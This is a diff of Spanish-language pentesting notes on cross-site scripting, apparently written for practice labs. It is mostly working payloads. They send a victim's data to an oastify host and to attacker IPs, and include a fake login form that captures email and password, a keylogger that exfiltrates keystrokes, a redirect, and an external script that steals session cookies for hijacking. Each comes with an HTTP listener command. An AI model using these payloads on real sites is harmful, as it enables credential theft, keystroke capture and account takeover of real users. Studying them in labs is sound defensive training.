@@ -18,6 +18,9 @@ A continuación, se proporciona el proyecto de GitHub correspondiente al laborat
 
 -   **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)
 * [Ejercicios-XSS](https://sudo.co.il/xss/)
+
+Los XSS pueden interpretar código en **HTML y/o  JavaScript** y es ahí en donde podemos colocar las inyecciones.
+
 ## HTML
 
 ```javascript
@@ -38,37 +41,43 @@ A continuación, se proporciona el proyecto de GitHub correspondiente al laborat
 
 ## JavaScript en la web
 
-Los XSS pueden interpretar código en **HTML y/o  JavaScript** y es ahí en donde podemos colocar las inyecciones.
-
 ```javascript
-<script>alert("XSS")</script>                                /// Creamos una ventana emergente con codigo javascript que dice XSS
+<script>alert("XSS")</script>          /// Creamos una ventana emergente con codigo javascript que dice XSS
+<script>prompt('Mensaje')</script>     /// Ventana emergente para ingresar algun dato                
 
-<script>                                                     /// Para mandar algo por el metodo POST a un dominio 
+<script>                               /// Para mandar algo por el metodo POST a un dominio 
   fetch('https://kwklry4t8e18m8q8k5uikgydy44vslga.oastify.com',{method:'POST', mode:'no-cors', body:'omar'});
 </script>
 ```
 
-----
-Podemos crear un script en donde nos devuelva el correo o algún dato a nuestra IP con un servidor hecho con http,  colocamos la IP de nuestro servidor en fetch.
+## Recibir información por medio de un 'Alert'  
+
 ```javascript
+// Podemos crear un script en donde nos devuelva el correo o algún dato a nuestra IP. 
+
 <script>
     var email = prompt("Por favor, introduce tu correo electronico para visualizar el post", "example@example.com");
 
-    if (email == null || email == ""){
+    if (email == null || email == ""){   
         alert("Es necesario introducir un correo para ver el post");
     } else{
         fetch("http://192.168.68.108/?email=" + email );  
     }
 </script>
+
+	/// If = Verificar si el correo esta vacio o no
+	/// fetch = Realizar una peticion a nuestra IP de atacante para recibir la informacion 
 ```
 
 ```bash
 ❯ python3 -m http.server 80                 # Nos montamos un servidor http 80 para recibir las peticiones 
 ```
 
-----
-También lo podemos hacer con HTML (Phishing)
+## Recibir información 
+
 ```html
+<!-- También lo podemos hacer con HTML y Javascript para poder hacer un (Phishing), el cual nos regresara a nuestra maquina victima el correo y la passwd de la victima -->
+
 <div id="formContainer"></div>
 
 <script>
@@ -80,7 +89,7 @@ También lo podemos hacer con HTML (Phishing)
 		'<input type="button" onclick="submitForm()" value="Submit">' +
 		'</form>';
 		
-	document.getElementByld(formContainer”).innerHTML = form;
+	document.getElementByld("formContainer”).innerHTML = form;
 	
 	function submitForm() {
 		email = document.getElementByld("email").value;
@@ -94,59 +103,69 @@ También lo podemos hacer con HTML (Phishing)
 ❯ python3 -m http.server 80                 # Nos montamos un servidor http 80 para recibir las peticiones 
 ```
 
-----
-Podemos crear un Keylogger JavaScript
+
+## Keylogger JavaScript
+
 ```javascript
+// Podriamos ver las pulsaciones de teclado en tiempo real dentro de la web
+
 <script>
-   var k = "";    document.onkeypress = funtion(e){
-        e = e || window.event;                        // Opcional para que en cualquier navegador funcione el Keylogger
+   var k = "";    
+   document.onkeypress = funtion(e){
+        e = e || window.event;                 // Opcional para que en cualquier navegador funcione el Keylogger
         k += e.key;
         var i = new Image();
         i.src = "http://192.168.68.111/" + k;
     };
 </script>
+
+	// K = Variable que almacena las pulsaciones  
 ```
 
 ```bash
 ❯ python3 -m http.server 80  | grep -oP "GET /\k[^.*\s]+"      # Nos montamos un servidor http 80 para recibir las peticiones y que las filtre 
 ```
 
-----
-Podemos crear un Script para redirigir al usuario
+## Redirección al usuario 
+
 ```javascript
+// Podemos crear un Script para redirigir al usuario a otra pagina web 
+
 <script>
 	window.location.href = "https://hack4u.io";
 </script>
 ```
 
-## JavaScript 
+## JavaScript robar cookie de Sesión 
 
 Web para identificar un [Json Web Token](https://jwt.io/), este se encuentra en: **Ctrl + Shift + c > Application/Storage > Session**
 
 External JavaScript Source, podemos cargar código desde un servidor externo para tratar de robarle la cookie de sesión.
-* Debemos de ver en la web que no tenga activa el **httpOnly** y se encuentra en **Application** ya que eso impediria poder robarla.
+* Debemos de ver en la web que no tenga activado el **httpOnly** el cual se encuentra en **Application** ya que eso impediría poder robarla.
 * Esto seria un **Cookie Hijacking**
 
-Esto lo colcaremos en la web de prueba y crearemos la publicacion
 ```javascript
+// 1. Esto lo colocaremos en la web de prueba y crearemos la publicación
+
 <script src="http://192.168.68.111/test.js"></script>
 ```
-* Cuando creas el archivo .js ya no es necesario poner las cabeceras <script></script> y lo podemos pegar directamente en la web de prueba
-```bash
-❯ nvim test.js                                                  # Creamos el archivo js
-```
 
-Con este robamos la Cookie de Sesion del usuario.
 ```javascript
-var request = new XMLHttpRequest();
-request.open('GET', 'http://192.168.68.111/?cookie=' + document.cookie);
-request.send();         
+// 2. En nuestra maquina de atacante crearemos este archivo 'js' con el cual robaremos la Cookie de Sesion del usuario
+
+❯ nvim test.js                                                  # Creamos el archivo js
+
+	var request = new XMLHttpRequest();
+	request.open('GET', 'http://192.168.68.111/?cookie=' + document.cookie);
+	request.send();         
 ```
 
 ```bash
-❯ python3 -m http.server 80                                     # Nos montamos un servidor http 80 para recibir las peticiones 
+❯ python3 -m http.server 80               # Nos montamos un servidor http 80 para recibir las peticiones 
+
+# Después de tener la 'Cookie de Session' podemos pegarla en donde se encuentra la nuestra 'sustituyendola' en la web y así cuando recarguemos la pagina, iniciaremos como el otro usuario.
 ```
-Después de tener la **Cookie de Session** podemos pegarla en donde se encuentra la nuestra 'sustituyendola' en la web y así cuando recarguemos la pagina, estaremos como el otro usuario.
+
 
 ----
 
